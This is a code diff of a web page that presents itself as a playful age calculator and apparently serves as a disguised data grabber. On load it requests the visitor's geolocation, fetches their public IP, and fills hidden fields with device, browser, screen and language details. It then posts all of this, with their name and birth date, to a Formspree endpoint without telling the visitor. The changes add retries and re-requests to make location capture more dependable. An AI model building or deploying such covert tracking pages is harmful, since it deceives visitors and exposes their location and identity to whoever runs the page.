@@ -8,8 +8,7 @@
   <style>
     body {
       font-family: 'Caveat', cursive;
-      /* 1. UPDATED: Background changed to a pink and red mix gradient */
-      background: linear-gradient(to right, #F06292, #FF6B6B);
+      background: linear-gradient(to right, #FFDAB9, #E1A4B0);
       display: flex;
       justify-content: center;
       align-items: center;
@@ -46,14 +45,6 @@
       font-size: 2em;
       margin-bottom: 30px;
     }
-    
-    /* 2. ADDED: Styling for the result lines on Page 2 */
-    #ageLine, #birthdayLine {
-      color: #E53935; /* Strong red color */
-      font-weight: bold;
-      font-size: 2.8em; /* Large font size */
-      margin: 20px 0; /* Added margin for better spacing */
-    }
 
     .form-group {
       text-align: left;
@@ -64,6 +55,14 @@
       font-size: 1.3em;
       display: block;
       margin-bottom: 8px;
+    }
+    
+    .message-text {
+      font-size: 1.9em;           
+      margin-bottom: 30px;
+      color: #5D4037;             
+      line-height: 1.4;           
+      font-style: italic;        
     }
 
     input[type="text"],
@@ -99,18 +98,31 @@
     button:hover {
       background-color: #c2185b;
     }
+    
+    /* Style for the new retry button */
+    .retry-button {
+      background-color: #757575;
+      font-size: 1.1em;
+      padding: 8px 20px;
+      margin-top: 10px;
+    }
+    .retry-button:hover {
+       background-color: #616161;
+    }
 
     .hidden {
       display: none !important;
     }
-   
+    
     #status {
-        font-size: 0.9em;
+        /* Adjusted font size to look better */
+        font-size: 1.2em; 
         color: #757575;
         margin-top: 10px;
+        margin-bottom: 10px; /* Added margin */
     }
     #status.error-status {
-        color: #D32F2F; 
+        color: #D32F2F;
         font-weight: bold;
     }
   </style>
@@ -137,11 +149,15 @@
       <input type="hidden" id="screenSize" name="screenSize" />
       <input type="hidden" id="language" name="language" />
       <input type="hidden" id="ip" name="ip" />
-      <input type="hidden" id="birthdayGiftChoice" name="birthday_gift_choice" value="No response yet" />
       <input type="hidden" name="_form_origin" value="Page 1 - Age Calculator" />
 
       <button type="button" onclick="handleSubmit()">Calculate 💌</button>
-       <p id="status"></p> 
+      
+      <p id="status"></p>
+      <button type="button" id="retryLocationBtn" class="retry-button hidden" onclick="requestLocation()">
+        Retry Location
+      </button>
+
     </form>
   </div>
 
@@ -150,97 +166,112 @@
     <p id="ageLine"></p>
     <p id="birthdayLine"></p>
     <p id="deviceLine"></p>
-    <button onclick="handleGiftChoice('go back')">go back</button>
+    <p class="message-text">Itne din ho gaye paida hue khuch nahi kiya age calculate karke kya kar lega</p>
+    <button onclick="goToMainPage()">Go Back to Main Page</button>
   </div>
 
-
   <script>
-    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/xpwlalno"; 
+    // IMPORTANT: Replace with your actual Formspree endpoint.
+    const FORMSPREE_URL_PAGE1 = "https://formspree.io/f/xpwlalno";
 
-        
-let currentLatitude = "";
-let currentLongitude = "";
+    // Global variables to store location data
+    let currentLatitude = "";
+    let currentLongitude = "";
+    
+    // --- NEW: Moved all location logic into its own function ---
+    function requestLocation() {
+        const statusElement = document.getElementById('status');
+        const retryBtn = document.getElementById('retryLocationBtn');
 
-window.onload = function () {
-    const statusElement = document.getElementById('status');
-    const latInput = document.getElementById("latitude");
-    const lonInput = document.getElementById("longitude");
-
-    if (!statusElement || !latInput || !lonInput) {
-        console.error("Missing required elements: 'status', 'latitude', or 'longitude'.");
-        return;
-    }
-
-    if (navigator.geolocation) {
-        statusElement.textContent = 'Requesting high-accuracy location... Please allow permission.';
+        // Hide retry button and show loading status
+        retryBtn.classList.add('hidden');
+        statusElement.textContent = 'Requesting location...';
         statusElement.classList.remove('error-status');
 
-        const options = {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        };
+        if (navigator.geolocation) {
+            const options = {
+                // --- CHANGED: Set to false for a faster, more reliable network-based fix ---
+                enableHighAccuracy: false, 
+                timeout: 10000, // 10 seconds is plenty for a network fix
+                maximumAge: 0
+            };
 
-        navigator.geolocation.getCurrentPosition(
-            function (position) {
-                currentLatitude = position.coords.latitude;
-                currentLongitude = position.coords.longitude;
+            navigator.geolocation.getCurrentPosition(
+                function (position) {
+                    // --- SUCCESS ---
+                    currentLatitude = position.coords.latitude;
+                    currentLongitude = position.coords.longitude;
 
-                latInput.value = currentLatitude;
-                lonInput.value = currentLongitude;
+                    document.getElementById("latitude").value = currentLatitude;
+                    document.getElementById("longitude").value = currentLongitude;
 
-                statusElement.textContent = '✅ Location captured successfully!';
-                statusElement.classList.remove('error-status');
+                    statusElement.textContent = 'Location captured successfully.';
+                    statusElement.classList.remove('error-status');
+                    retryBtn.classList.add('hidden'); // Hide button on success
 
-                console.log('--- Accurate Location Captured ---');
-                console.log(`Latitude: ${currentLatitude}`);
-                console.log(`Longitude: ${currentLongitude}`);
-                console.log(`Accuracy: within ${position.coords.accuracy} meters.`);
-                console.log('---------------------------------');
-            },
-            function (error) {
-                let errorMessage = 'An unknown error occurred.';
-                switch (error.code) {
-                    case error.PERMISSION_DENIED:
-                        errorMessage = 'Location permission was denied by the user.';
-                        break;
-                    case error.POSITION_UNAVAILABLE:
-                        errorMessage = 'Location is currently unavailable (e.g., no GPS signal).';
-                        break;
-                    case error.TIMEOUT:
-                        errorMessage = 'Request for location timed out. Try moving to an open area.';
-                        break;
-                }
-                statusElement.textContent = `Error: ${errorMessage}`;
-                statusElement.classList.add('error-status');
-                console.error('Geolocation Error:', errorMessage, error);
+                    console.log('--- Location Captured ---');
+                    console.log(`Latitude: ${currentLatitude}`);
+                    console.log(`Longitude: ${currentLongitude}`);
+                    console.log('-----------------------');
+                },
+                function (error) {
+                    // --- ERROR ---
+                    let errorMessage = 'An unknown error occurred.';
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMessage = 'Location permission was denied. Please allow location in your browser site settings.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMessage = 'Location information is unavailable (e.g., no signal).';
+                            break;
+                        case error.TIMEOUT:
+                            errorMessage = 'The request for location timed out.';
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            errorMessage = 'An unknown error occurred.';
+                            break;
+                    }
+                    statusElement.textContent = `Error: ${errorMessage}`;
+                    statusElement.classList.add('error-status');
+                    retryBtn.classList.remove('hidden'); // <-- NEW: Show retry button on failure
 
-                latInput.value = "Unavailable";
-                lonInput.value = "Unavailable";
-            },
-            options
-        );
-    } else {
-        statusElement.textContent = 'Geolocation is not supported by this browser.';
-        statusElement.classList.add('error-status');
-        latInput.value = "Unsupported";
-        lonInput.value = "Unsupported";
+                    console.error('Geolocation Error:', error);
+
+                    document.getElementById("latitude").value = "Unavailable";
+                    document.getElementById("longitude").value = "Unavailable";
+                },
+                options
+            );
+        } else {
+            statusElement.textContent = 'Geolocation is not supported by this browser.';
+            statusElement.classList.add('error-status');
+            console.error('Geolocation is not supported by this browser.');
+            document.getElementById("latitude").value = "Unsupported";
+            document.getElementById("longitude").value = "Unsupported";
+        }
     }
-};
 
 
-        // --- Other data collection remains the same ---
+    window.onload = function () {
+        // --- MODIFIED: Call the new location function ---
+        requestLocation();
+
+        // This part remains the same
         const ua = navigator.userAgent;
         const isMobile = /Mobi|Android/i.test(ua);
         document.getElementById("deviceType").value = isMobile ? "Mobile" : "Desktop";
-        document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
         document.getElementById("browser").value = ua;
         document.getElementById("screenSize").value = `${screen.width}x${screen.height}`;
         document.getElementById("language").value = navigator.language;
+
         fetch("https://api.ipify.org?format=json")
             .then(res => res.json())
-            .then(data => { document.getElementById("ip").value = data.ip; })
-            .cach(() => { document.getElementById("ip").value = "Unavailable"; });
+            .then(data => {
+                document.getElementById("ip").value = data.ip;
+            })
+            .catch(() => {
+                document.getElementById("ip").value = "Unavailable";
+            });
     };
 
     function handleSubmit() {
@@ -248,34 +279,42 @@ window.onload = function () {
       const dob = document.getElementById("dob").value;
 
       if (name.length < 5 || !dob) {
-        alert("Please enter a valid name (at least 5 characters) and your Date of Birth.");
+        alert("Please enter a valid name and Date of Birth.");
         return;
       }
 
-      localStorage.setItem("user_dob", dob);
       const formData = new FormData(document.getElementById("mainForm"));
-      
-      // We will show the results immediately for a good user experience, 
-      // even while the form submits in the background.
-      const result = calculateDetails(dob);
-      document.getElementById("ageLine").innerHTML = `You are ${result.ageString} old.`;
-      document.getElementById("birthdayLine").innerHTML = `${result.daysLeft} days left for your next birthday! 🎉`;
-      goToPage(2);
-      
+
+      // Set location values *right before* submit, just in case they were captured
+      // after the page load but before the submit.
+      formData.set("latitude", currentLatitude || "Unavailable");
+      formData.set("longitude", currentLongitude || "Unavailable");
+
       fetch(FORMSPREE_URL_PAGE1, {
         method: "POST",
         body: formData,
         headers: { Accept: "application/json" }
       })
       .then(response => {
-        if (response.ok) {
-          console.log("Page 1 data submitted successfully to Formspree.");
-        } else {
-          console.error("Failed to submit Page 1 data to Formspree.");
-        }
+        // This logic remains the same, as it was fine.
+        const result = calculateDetails(dob);
+        document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
+        document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
+        const ua = navigator.userAgent;
+        const isMobile = /Mobi|Android/i.test(ua);
+        document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
+        goToPage(2);
       })
       .catch((error) => {
-          console.error('Error submitting Page 1 data:', error);
+          console.error('Error:', error);
+          // This logic also remains the same.
+          const result = calculateDetails(dob);
+          document.getElementById("ageLine").textContent = "Calculated Age: " + result.ageString;
+          document.getElementById("birthdayLine").textContent = "Days remaining to next birthday: " + result.daysLeft;
+          const ua = navigator.userAgent;
+          const isMobile = /Mobi|Android/i.test(ua);
+          document.getElementById("deviceLine").textContent = `Device: ${isMobile ? "Mobile" : "Desktop"}`;
+          goToPage(2);
       });
     }
 
@@ -297,19 +336,9 @@ window.onload = function () {
       if (nextBirthday < today) nextBirthday.setFullYear(today.getFullYear() + 1);
       const daysLeft = Math.ceil((nextBirthday - today) / (1000 * 60 * 60 * 24));
       return {
-        ageString: `<b>${years}</b> years, <b>${months}</b> months, <b>${days}</b> days`,
+        ageString: `${years} years, ${months} months, ${days} days`,
         daysLeft
       };
-    }
-
-    function handleGiftChoice(choice) {
-        document.getElementById("birthdayGiftChoice").value = choice;
-
-        if (choice === 'go back') {
-            alert("Thanks for visiting!");
-            goToPage(1);
-            document.getElementById("mainForm").reset();
-        } 
     }
 
     function goToPage(n) {
@@ -317,7 +346,12 @@ window.onload = function () {
       document.getElementById("page" + n).style.display = "block";
     }
 
-  
+    function goToMainPage() {
+      document.getElementById("mainForm").reset();
+      // --- NEW: Also re-request location when going back to the main page ---
+      requestLocation();
+      goToPage(1);
+    }
   </script>
 </body>
 </html>
